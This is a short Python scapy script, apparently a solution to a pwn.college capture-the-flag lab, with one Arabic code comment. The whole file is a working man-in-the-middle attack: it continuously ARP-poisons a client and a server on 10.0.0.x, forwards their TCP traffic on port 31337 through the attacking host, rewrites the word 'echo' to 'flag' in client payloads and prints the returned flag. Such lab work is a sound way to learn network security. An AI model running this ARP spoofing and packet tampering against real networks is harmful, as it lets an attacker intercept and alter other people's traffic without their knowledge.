"""


"""



from scapy.all import *
import threading
import time

iface      = "eth0"
my_mac     = get_if_hwaddr(iface)
client_ip  = "10.0.0.2"
server_ip  = "10.0.0.3"
client_mac = getmacbyip(client_ip)
server_mac = getmacbyip(server_ip)

print(f"[*] Client : {client_ip} ({client_mac})")
print(f"[*] Server : {server_ip} ({server_mac})")

def arp_poison():
    while True:
        sendp(Ether(dst=client_mac) /
              ARP(op=2, pdst=client_ip, hwdst=client_mac,
                  psrc=server_ip, hwsrc=my_mac),
              iface=iface, verbose=False)
        sendp(Ether(dst=server_mac) /
              ARP(op=2, pdst=server_ip, hwdst=server_mac,
                  psrc=client_ip, hwsrc=my_mac),
              iface=iface, verbose=False)
        time.sleep(1)

def handle(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return

    fwd = pkt.copy()

    # ← احذف الـ checksum دايماً مش بس لما في payload
    del fwd[IP].chksum
    del fwd[TCP].chksum

    if pkt[IP].src == client_ip:
        fwd[Ether].src = my_mac
        fwd[Ether].dst = server_mac

        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            print(f"[C→S] {payload}")
            if b"echo" in payload:
                fwd[Raw].load = payload.replace(b"echo", b"flag")
                del fwd[IP].chksum
                del fwd[TCP].chksum
                print("[!] Replaced echo → flag")

    elif pkt[IP].src == server_ip:
        fwd[Ether].src = my_mac
        fwd[Ether].dst = client_mac

        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            print(f"[S→C] {payload}")
            if b"pwn.college" in payload:
                print(f"\n[FLAG] {payload.decode(errors='ignore')}\n")

    sendp(fwd, iface=iface, verbose=False)

threading.Thread(target=arp_poison, daemon=True).start()
print("[+] Poisoning both sides...")
time.sleep(2)
print("[+] Forwarding + waiting for flag...\n")

sniff(
    iface=iface,
    filter=f"tcp port 31337 and not ether src {my_mac}",
    prn=handle
)
